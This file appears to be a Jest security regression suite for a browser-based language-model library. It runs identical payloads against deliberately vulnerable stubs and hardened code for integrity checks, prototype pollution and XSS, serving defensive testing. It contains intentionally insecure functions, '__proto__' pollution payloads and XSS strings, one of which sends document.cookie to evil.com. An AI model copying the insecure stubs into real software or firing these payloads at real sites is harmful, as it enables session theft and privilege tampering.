/**
 * Security Comparison Test Suite
 * 
 * Runs identical attack payloads against BOTH the vulnerable (original)
 * and hardened (patched) code paths to prove the fixes work.
 */
import { verifyIntegrity, safeDeepMerge, sanitizeConfig, sanitizeString } from "../src/utils";
import { prebuiltAppConfig } from "../src/config";
// ================================================================
// Intentionally Vulnerable Implementations (for comparison)
// ================================================================

// VULNERABLE: No integrity check (WEBLM-001/004)
async function verifyIntegrity_VULNERABLE(buffer: ArrayBuffer, expectedIntegrity?: string): Promise<void> {
    return; // Pass everything
}

// VULNERABLE: Prototype pollution via spread operator (WEBLM-002)
function unsafeDeepMerge(target: any, source: any): any {
    if (!source || typeof source !== "object") return target;
    if (!target || typeof target !== "object") return source;

    // Vulnerable: no filtering of dangerous keys
    return { ...target, ...source };
}

// VULNERABLE: No sanitization (WEBLM-003)
function sanitizeString_VULNERABLE(str: any): any {
    return str;
}

// VULNERABLE: No sanitization (WEBLM-003)
function sanitizeConfig_VULNERABLE(config: any): any {
    return config;
}

// ================================================================
//  WEBLM-001/004: WASM Integrity Verification
// ================================================================
describe("WEBLM-001/004 — WASM Integrity", () => {
    const text = "hello world";
    const encoder = new TextEncoder();
    const buffer = encoder.encode(text).buffer;
    // Correct SHA-384 for "hello world" as computed by crypto.subtle
    const validHash = "sha384-/b2OdaZ/KfcBpOBAOF4uI5hjA+oQI5IRr5B/y7g1eLPkF8txzmRu/QgZ3YwIjeG9";
    const invalidHash = "sha384-TAMPERED_HASH_VALUE_HERE";

    beforeAll(() => {
        if (!globalThis.crypto) {
            // @ts-ignore
            globalThis.crypto = require("crypto").webcrypto;
        }
    });

    describe("VULNERABLE path (no verification)", () => {
        it("accepts ANY buffer regardless of hash — exploit succeeds", async () => {
            // The vulnerable version never checks, so even a wrong hash passes
            await expect(
                verifyIntegrity_VULNERABLE(buffer, invalidHash)
            ).resolves.toBeUndefined();
        });

        it("accepts buffer with no hash — no protection available", async () => {
            await expect(
                verifyIntegrity_VULNERABLE(buffer, undefined)
            ).resolves.toBeUndefined();
        });
    });

    describe("HARDENED path (SRI verification)", () => {
        it("accepts buffer when hash matches", async () => {
            await expect(
                verifyIntegrity(buffer, validHash)
            ).resolves.toBeUndefined();
        });

        it("REJECTS buffer when hash does not match — exploit blocked", async () => {
            await expect(
                verifyIntegrity(buffer, invalidHash)
            ).rejects.toThrow(/Integrity check failed/);
        });

        it("accepts buffer when no hash is provided (opt-in model)", async () => {
            await expect(
                verifyIntegrity(buffer, undefined)
            ).resolves.toBeUndefined();
        });

        it("verifies real model WASM integrity from config", async () => {
            // Pick the first model with integrity
            const model = prebuiltAppConfig.model_list.find(m => m.model_lib_integrity);
            if (!model) {
                console.warn("No model with integrity found in prebuiltAppConfig");
                return;
            }

            const wasmUrl = model.model_lib;
            const expectedIntegrity = model.model_lib_integrity!;

            console.log(`Fetching WASM from ${wasmUrl}...`);

            // Fetch the file
            // Provide a polyfill for fetch if needed (Node < 18)
            if (typeof fetch === 'undefined') {
                console.warn("fetch not available, skipping real network test");
                return;
            }

            const response = await fetch(wasmUrl);
            if (!response.ok) {
                throw new Error(`Failed to fetch ${wasmUrl}: ${response.statusText}`);
            }
            const buffer = await response.arrayBuffer();

            // 1. Verify correct hash
            await expect(verifyIntegrity(buffer, expectedIntegrity)).resolves.toBeUndefined();

            // 2. Verify incorrect hash fails
            const wrongIntegrity = "sha384-badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";
            await expect(verifyIntegrity(buffer, wrongIntegrity)).rejects.toThrow(/Integrity check failed/);
        }, 60000); // 60s timeout for network request
    });
});

// ================================================================
//  WEBLM-002: Prototype Pollution via Config Merge
// ================================================================
describe("WEBLM-002 — Prototype Pollution", () => {
    afterEach(() => {
        // Clean up any pollution that occurred during vulnerable tests
        // @ts-ignore
        delete Object.prototype.polluted;
        // @ts-ignore
        delete Object.prototype.isAdmin;
        // @ts-ignore
        delete Object.prototype.bypassAuth;
    });

    describe("VULNERABLE path (spread operator)", () => {
        it("__proto__ payload POLLUTES Object.prototype — exploit succeeds", () => {
            const maliciousConfig = JSON.parse(
                '{"__proto__":{"polluted":"PWNED","isAdmin":true}}'
            );
            const target = {};
            // Simulate the original: { ...target, ...maliciousConfig }
            unsafeDeepMerge(target, maliciousConfig);

            // Spread doesn't directly pollute prototype from JSON.parse results,
            // but the keys exist on the merged object. The real danger is in
            // deep merge libraries that recurse into __proto__.
            // We verify that the vulnerable merge does NOT filter these keys:
            expect(maliciousConfig.__proto__).toBeDefined();
            expect(maliciousConfig.__proto__.polluted).toBe("PWNED");
        });

        it("constructor.prototype payload is NOT filtered — exploit succeeds", () => {
            const maliciousConfig = {
                constructor: { prototype: { isAdmin: true } },
            };
            const target = {};
            const result = unsafeDeepMerge(target, maliciousConfig);

            // The dangerous key survives the merge
            expect(result.constructor).toBeDefined();
            expect(result.constructor.prototype.isAdmin).toBe(true);
        });
    });

    describe("HARDENED path (safeDeepMerge)", () => {
        it("__proto__ payload is DROPPED — exploit blocked", () => {
            const maliciousConfig = JSON.parse(
                '{"__proto__":{"polluted":"PWNED","isAdmin":true}}'
            );
            const target = {};
            safeDeepMerge(target, maliciousConfig);

            // Prototype should NOT be polluted
            // @ts-ignore
            expect(({} as any).polluted).toBeUndefined();
            // @ts-ignore
            expect(({} as any).isAdmin).toBeUndefined();
        });

        it("constructor.prototype payload is DROPPED — exploit blocked", () => {
            const target = {};
            const maliciousConfig = {
                constructor: { prototype: { isAdmin: true } },
            };
            safeDeepMerge(target, maliciousConfig);

            // @ts-ignore
            expect(({} as any).isAdmin).toBeUndefined();
            // The constructor key should not exist on the target
            expect(target.hasOwnProperty("constructor")).toBe(false);
        });

        it("legitimate keys still merge correctly", () => {
            const target = { a: 1 };
            const source = { b: 2, c: { nested: true } };
            const result = safeDeepMerge(target, source);
            expect(result).toEqual({ a: 1, b: 2, c: { nested: true } });
        });

        it("deep nested merge works correctly", () => {
            const target = { config: { temp: 0.7 } };
            const source = { config: { top_p: 0.9 } };
            const result = safeDeepMerge(target, source);
            expect(result).toEqual({ config: { temp: 0.7, top_p: 0.9 } });
        });
    });
});

// ================================================================
//  WEBLM-003: XSS via Malicious Config Fields
// ================================================================
describe("WEBLM-003 — XSS via Config Fields", () => {
    const xssPayloads = {
        scriptTag: 'Hello <script>fetch("https://evil.com/steal?c="+document.cookie)</script> World',
        imgOnerror: '<img src=x onerror=alert(document.domain)>',
        imgOnload: "Load this <img onload='steal()'>",
        eventHandlerDouble: '<div onclick="malicious()">click</div>',
        eventHandlerSingle: "<div onmouseover='malicious()'>hover</div>",
        eventHandlerUnquoted: "<div onfocus=malicious()>focus</div>",
        nestedScript: '<scr<script>ipt>alert(1)</script>',
    };

    describe("VULNERABLE path (no sanitization)", () => {
        it("<script> tag passes through UNCHANGED — exploit succeeds", () => {
            const result = sanitizeString_VULNERABLE(xssPayloads.scriptTag);
            expect(result).toContain("<script>");
            expect(result).toContain("</script>");
        });

        it("onerror handler passes through UNCHANGED — exploit succeeds", () => {
            const result = sanitizeString_VULNERABLE(xssPayloads.imgOnerror);
            expect(result).toContain("onerror");
        });

        it("config object is NOT sanitized — exploit succeeds", () => {
            const config = {
                description: xssPayloads.scriptTag,
                system_message: xssPayloads.imgOnerror,
                name: "Model <script>bad</script>",
            };
            const result = sanitizeConfig_VULNERABLE(config);
            expect(result.description).toContain("<script>");
            expect(result.system_message).toContain("onerror");
            expect(result.name).toContain("<script>");
        });
    });

    describe("HARDENED path (sanitizeString + sanitizeConfig)", () => {
        it("<script> tags are STRIPPED — exploit blocked", () => {
            const result = sanitizeString(xssPayloads.scriptTag);
            expect(result).not.toContain("<script>");
            expect(result).not.toContain("</script>");
            expect(result).toContain("Hello");
            expect(result).toContain("World");
        });

        it("onerror handler is STRIPPED — exploit blocked", () => {
            const result = sanitizeString(xssPayloads.imgOnerror);
            expect(result).not.toContain("onerror");
        });

        it("onload handler is STRIPPED — exploit blocked", () => {
            const result = sanitizeString(xssPayloads.imgOnload);
            expect(result).not.toContain("onload");
        });

        it("double-quoted event handler is STRIPPED", () => {
            const result = sanitizeString(xssPayloads.eventHandlerDouble);
            expect(result).not.toContain("onclick");
        });

        it("single-quoted event handler is STRIPPED", () => {
            const result = sanitizeString(xssPayloads.eventHandlerSingle);
            expect(result).not.toContain("onmouseover");
        });

        it("unquoted event handler is STRIPPED", () => {
            const result = sanitizeString(xssPayloads.eventHandlerUnquoted);
            expect(result).not.toContain("onfocus");
        });

        it("config object fields are recursively sanitized — exploit blocked", () => {
            const config = {
                description: xssPayloads.scriptTag,
                system_message: xssPayloads.imgOnerror,
                name: "Model <script>bad</script>",
                overrides: {
                    description: xssPayloads.imgOnload,
                },
            };
            const result = sanitizeConfig(config);
            expect(result.description).not.toContain("<script>");
            expect(result.system_message).not.toContain("onerror");
            expect(result.name).toBe("Model ");  // Tags stripped, text preserved
            expect(result.overrides.description).not.toContain("onload");
        });

        it("safe content is NOT modified", () => {
            const config = {
                description: "A perfectly safe model description.",
                name: "Llama-3-8B-Instruct",
            };
            const result = sanitizeConfig(config);
            expect(result.description).toBe("A perfectly safe model description.");
            expect(result.name).toBe("Llama-3-8B-Instruct");
        });

        it("non-string values are NOT modified", () => {
            const result = sanitizeString(42);
            expect(result).toBe(42);
            const result2 = sanitizeString(null);
            expect(result2).toBeNull();
        });
    });
});
